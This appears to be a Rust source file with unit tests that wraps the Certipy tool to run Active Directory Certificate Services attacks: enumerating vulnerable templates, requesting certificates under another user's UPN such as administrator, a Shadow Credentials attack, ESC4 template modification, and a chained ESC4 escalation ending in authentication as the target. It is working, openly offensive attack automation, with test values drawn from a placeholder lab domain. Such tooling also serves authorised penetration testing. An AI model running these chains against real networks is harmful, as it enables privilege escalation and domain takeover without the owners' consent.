//! ADCS / Certipy privilege escalation tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Enumerate ADCS certificate templates and CAs using Certipy.
///
/// Required args: `username`, `domain`, `password`, `dc_ip`
/// Optional args: `vulnerable`
pub async fn certipy_find(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let vulnerable = optional_bool(args, "vulnerable").unwrap_or(false);

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("find")
        .flag("-u", user_at_domain)
        .flag("-p", password)
        .flag("-dc-ip", dc_ip)
        .arg("-text")
        .arg_if(vulnerable, "-vulnerable")
        .timeout_secs(120)
        .execute()
        .await
}

/// Request a certificate from an ADCS CA using Certipy.
///
/// Required args: `username`, `domain`, `password`, `ca`, `template`, `dc_ip`
/// Optional args: `upn`
pub async fn certipy_request(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let ca = required_str(args, "ca")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let upn = optional_str(args, "upn");

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("req")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-ca", ca)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .flag_opt("-upn", upn)
        .timeout_secs(120)
        .execute()
        .await
}

/// Authenticate with a PFX certificate using Certipy.
///
/// Required args: `pfx_path`, `dc_ip`, `domain`
pub async fn certipy_auth(args: &Value) -> Result<ToolOutput> {
    let pfx_path = required_str(args, "pfx_path")?;
    let dc_ip = required_str(args, "dc_ip")?;
    let domain = required_str(args, "domain")?;

    CommandBuilder::new("certipy")
        .arg("auth")
        .flag("-pfx", pfx_path)
        .flag("-dc-ip", dc_ip)
        .flag("-domain", domain)
        .timeout_secs(120)
        .execute()
        .await
}

/// Perform Certipy Shadow Credentials attack (auto mode).
///
/// Required args: `username`, `domain`, `password`, `target`, `dc_ip`
pub async fn certipy_shadow(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let target = required_str(args, "target")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("shadow")
        .arg("auto")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-account", target)
        .flag("-dc-ip", dc_ip)
        .timeout_secs(120)
        .execute()
        .await
}

/// Modify a certificate template for ESC4 exploitation using Certipy.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`
pub async fn certipy_template_esc4(args: &Value) -> Result<ToolOutput> {
    let username = required_str(args, "username")?;
    let domain = required_str(args, "domain")?;
    let password = required_str(args, "password")?;
    let template = required_str(args, "template")?;
    let dc_ip = required_str(args, "dc_ip")?;

    let user_at_domain = format!("{username}@{domain}");

    CommandBuilder::new("certipy")
        .arg("template")
        .flag("-username", user_at_domain)
        .flag("-password", password)
        .flag("-template", template)
        .flag("-dc-ip", dc_ip)
        .arg("-save-old")
        .timeout_secs(120)
        .execute()
        .await
}

/// Run the full ESC4 exploitation chain: template modification -> cert
/// request -> authentication.
///
/// Required args: `username`, `domain`, `password`, `template`, `dc_ip`,
///                `ca`, `pfx_path`
/// Optional args: `upn`
pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
    let template_output = certipy_template_esc4(args).await?;
    let request_output = certipy_request(args).await?;
    let auth_output = certipy_auth(args).await?;

    let combined_stdout = format!(
        "=== Step 1: Template Modification ===\n{}\n\
         === Step 2: Certificate Request ===\n{}\n\
         === Step 3: Authentication ===\n{}",
        template_output.stdout, request_output.stdout, auth_output.stdout
    );
    let combined_stderr = format!(
        "=== Step 1: Template Modification ===\n{}\n\
         === Step 2: Certificate Request ===\n{}\n\
         === Step 3: Authentication ===\n{}",
        template_output.stderr, request_output.stderr, auth_output.stderr
    );

    // The chain succeeds only if the final auth step succeeded.
    Ok(ToolOutput {
        stdout: combined_stdout,
        stderr: combined_stderr,
        exit_code: auth_output.exit_code,
        success: template_output.success && request_output.success && auth_output.success,
    })
}

#[cfg(test)]
mod tests {
    use crate::args::{optional_bool, optional_str, required_str};
    use serde_json::json;

    // --- certipy_find ---

    #[test]
    fn certipy_find_missing_username() {
        let args = json!({
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "username").is_err());
    }

    #[test]
    fn certipy_find_missing_domain() {
        let args = json!({
            "username": "admin",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn certipy_find_missing_password() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "password").is_err());
    }

    #[test]
    fn certipy_find_missing_dc_ip() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn certipy_find_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    #[test]
    fn certipy_find_vulnerable_default_false() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        let vulnerable = optional_bool(&args, "vulnerable").unwrap_or(false);
        assert!(!vulnerable);
    }

    #[test]
    fn certipy_find_vulnerable_set_true() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10",
            "vulnerable": true
        });
        let vulnerable = optional_bool(&args, "vulnerable").unwrap_or(false);
        assert!(vulnerable);
    }

    // --- certipy_request ---

    #[test]
    fn certipy_request_missing_ca() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "template": "ESC1",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "ca").is_err());
    }

    #[test]
    fn certipy_request_missing_template() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "template").is_err());
    }

    #[test]
    fn certipy_request_user_at_domain_format() {
        let args = json!({
            "username": "lowpriv",
            "domain": "contoso.local",
            "password": "Secret123",
            "ca": "corp-CA",
            "template": "VulnTemplate",
            "dc_ip": "192.168.58.1"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "lowpriv@contoso.local");
    }

    #[test]
    fn certipy_request_upn_present() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "template": "ESC1",
            "dc_ip": "192.168.58.10",
            "upn": "administrator@contoso.local"
        });
        assert_eq!(
            optional_str(&args, "upn"),
            Some("administrator@contoso.local")
        );
    }

    #[test]
    fn certipy_request_upn_absent() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "contoso-DC01-CA",
            "template": "ESC1",
            "dc_ip": "192.168.58.10"
        });
        assert!(optional_str(&args, "upn").is_none());
    }

    // --- certipy_auth ---

    #[test]
    fn certipy_auth_missing_pfx_path() {
        let args = json!({
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "pfx_path").is_err());
    }

    #[test]
    fn certipy_auth_missing_dc_ip() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "domain": "contoso.local"
        });
        assert!(required_str(&args, "dc_ip").is_err());
    }

    #[test]
    fn certipy_auth_missing_domain() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "domain").is_err());
    }

    #[test]
    fn certipy_auth_all_args() {
        let args = json!({
            "pfx_path": "/tmp/admin.pfx",
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert_eq!(required_str(&args, "pfx_path").unwrap(), "/tmp/admin.pfx");
        assert_eq!(required_str(&args, "dc_ip").unwrap(), "192.168.58.10");
        assert_eq!(required_str(&args, "domain").unwrap(), "contoso.local");
    }

    // --- certipy_shadow ---

    #[test]
    fn certipy_shadow_missing_target() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn certipy_shadow_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "target": "dc01$",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    // --- certipy_template_esc4 ---

    #[test]
    fn certipy_template_esc4_missing_template() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "template").is_err());
    }

    #[test]
    fn certipy_template_esc4_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "template": "ESC4Template",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    // --- mock executor tests ---

    use crate::executor::mock;

    #[tokio::test]
    async fn certipy_find_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_find(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_find_vulnerable_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "dc_ip": "192.168.58.1", "vulnerable": true
        });
        assert!(super::certipy_find(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC1",
            "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_with_upn_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC1",
            "dc_ip": "192.168.58.1", "upn": "administrator@contoso.local"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_auth_executes() {
        mock::push(mock::success());
        let args = json!({
            "pfx_path": "/tmp/admin.pfx", "dc_ip": "192.168.58.1",
            "domain": "contoso.local"
        });
        assert!(super::certipy_auth(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_shadow_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "target": "dc01$", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_shadow(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_template_esc4_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "template": "ESC4", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_template_esc4(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_esc4_full_chain_executes() {
        // 3 execute calls: template, request, auth
        mock::push(mock::success());
        mock::push(mock::success());
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "template": "ESC4", "dc_ip": "192.168.58.1",
            "ca": "contoso-CA", "pfx_path": "/tmp/admin.pfx"
        });
        assert!(super::certipy_esc4_full_chain(&args).await.is_ok());
    }
}
